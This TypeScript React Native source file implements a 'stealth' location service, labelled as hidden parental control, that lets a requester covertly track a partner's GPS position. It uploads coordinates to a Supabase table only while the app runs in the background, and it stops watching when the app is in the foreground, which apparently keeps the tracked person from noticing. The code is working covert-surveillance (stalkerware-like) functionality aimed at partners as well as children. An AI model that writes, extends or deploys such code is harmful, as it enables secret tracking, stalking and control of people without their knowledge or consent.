/**
 * Service de localisation furtive (contrôle parental caché)
 * Migré de Firebase/Firestore vers Supabase Postgres + Realtime.
 */
import { supabase, TABLES } from '../supabase/config';
import { AppState, AppStateStatus } from 'react-native';
import * as Location from 'expo-location';
import { detectMockLocation } from './MockLocationDetector';

export interface StealthConfig {
  enabled: boolean;
  requesterId: string;
  conversationId: string;
  activatedAt: Date;
}

class StealthLocationService {
  private appStateSubscription: any = null;
  private locationSubscription: Location.LocationSubscription | null = null;
  private isTracking = false;
  private currentUserId: string | null = null;
  private currentConversationId: string | null = null;

  /** Activer le mode furtif sur un partenaire (côté demandeur) */
  async activateStealthMode(
    targetUserId: string,
    requesterId: string,
    conversationId: string
  ): Promise<void> {
    const { error } = await supabase.from(TABLES.STEALTH_TRACKING).upsert({
      user_id: targetUserId,
      enabled: true,
      requester_id: requesterId,
      conversation_id: conversationId,
      activated_at: new Date().toISOString(),
    }, { onConflict: 'user_id' });
    if (error) throw new Error(`Erreur activation mode furtif : ${error.message}`);
  }

  /** Désactiver le mode furtif */
  async deactivateStealthMode(targetUserId: string): Promise<void> {
    await supabase.from(TABLES.STEALTH_TRACKING).delete().eq('user_id', targetUserId);
    await this.stopStealthTracking();
  }

  /** Lire la config furtive pour un utilisateur donné */
  async getStealthConfig(userId: string): Promise<StealthConfig | null> {
    const { data } = await supabase
      .from(TABLES.STEALTH_TRACKING)
      .select('*')
      .eq('user_id', userId)
      .maybeSingle();
    if (!data) return null;
    return {
      enabled: data.enabled,
      requesterId: data.requester_id,
      conversationId: data.conversation_id,
      activatedAt: new Date(data.activated_at),
    };
  }

  /**
   * Écoute en temps réel si ce userId est suivi.
   * À appeler après l'authentification.
   */
  startListeningForStealthConfig(userId: string): () => void {
    const channel = supabase
      .channel(`stealth:${userId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: TABLES.STEALTH_TRACKING,
          filter: `user_id=eq.${userId}`,
        },
        async (payload) => {
          if (payload.eventType === 'DELETE' || !payload.new?.enabled) {
            await this.stopStealthTracking();
          } else if (payload.new?.enabled) {
            await this.startStealthTracking(userId, payload.new.conversation_id);
          }
        }
      )
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }

  /** Démarre le suivi furtif */
  async startStealthTracking(userId: string, conversationId: string): Promise<void> {
    if (this.isTracking) return;
    const { status } = await Location.getForegroundPermissionsAsync();
    if (status !== 'granted') return;
    const { status: bgStatus } = await Location.getBackgroundPermissionsAsync();
    if (bgStatus !== 'granted') {
      console.warn('[StealthLocationService] Permission arrière-plan non accordée — suivi furtif annulé.');
      return;
    }
    this.currentUserId = userId;
    this.currentConversationId = conversationId;
    this.isTracking = true;
    this.appStateSubscription = AppState.addEventListener('change', this.handleAppStateChange);
    await this.startLocationWatch();
  }

  /** Arrête le suivi */
  async stopStealthTracking(): Promise<void> {
    this.isTracking = false;
    this.currentUserId = null;
    this.currentConversationId = null;
    this.appStateSubscription?.remove();
    this.appStateSubscription = null;
    await this.stopLocationWatch();
  }

  private handleAppStateChange = async (nextState: AppStateStatus) => {
    if (!this.isTracking) return;
    if (nextState === 'active') {
      await this.stopLocationWatch();
    } else {
      await this.startLocationWatch();
    }
  };

  private async startLocationWatch(): Promise<void> {
    if (this.locationSubscription) return;
    try {
      this.locationSubscription = await Location.watchPositionAsync(
        { accuracy: Location.Accuracy.Balanced, timeInterval: 20_000, distanceInterval: 15 },
        (location) => this.publishStealthLocation(location)
      );
    } catch (err) {
      console.warn('[StealthLocationService] watchPositionAsync échoué :', err);
    }
  }

  private async stopLocationWatch(): Promise<void> {
    this.locationSubscription?.remove();
    this.locationSubscription = null;
  }

  private async publishStealthLocation(location: Location.LocationObject): Promise<void> {
    if (!this.currentUserId || !this.currentConversationId) return;
    if (AppState.currentState === 'active') return;
    const mockResult = detectMockLocation(location);
    try {
      await supabase.from(TABLES.LOCATION_SHARES).upsert({
        user_id: this.currentUserId,
        conversation_id: this.currentConversationId,
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        accuracy: location.coords.accuracy ?? null,
        speed: location.coords.speed ?? null,
        is_mocked: mockResult.isMocked,
        is_stealth_update: true,
        updated_at: new Date().toISOString(),
      }, { onConflict: 'conversation_id' });
    } catch (err) {
      console.warn('[StealthLocationService] Erreur écriture position :', err);
    }
  }

  get isStealthActive(): boolean {
    return this.isTracking;
  }
}

export const stealthLocationService = new StealthLocationService();
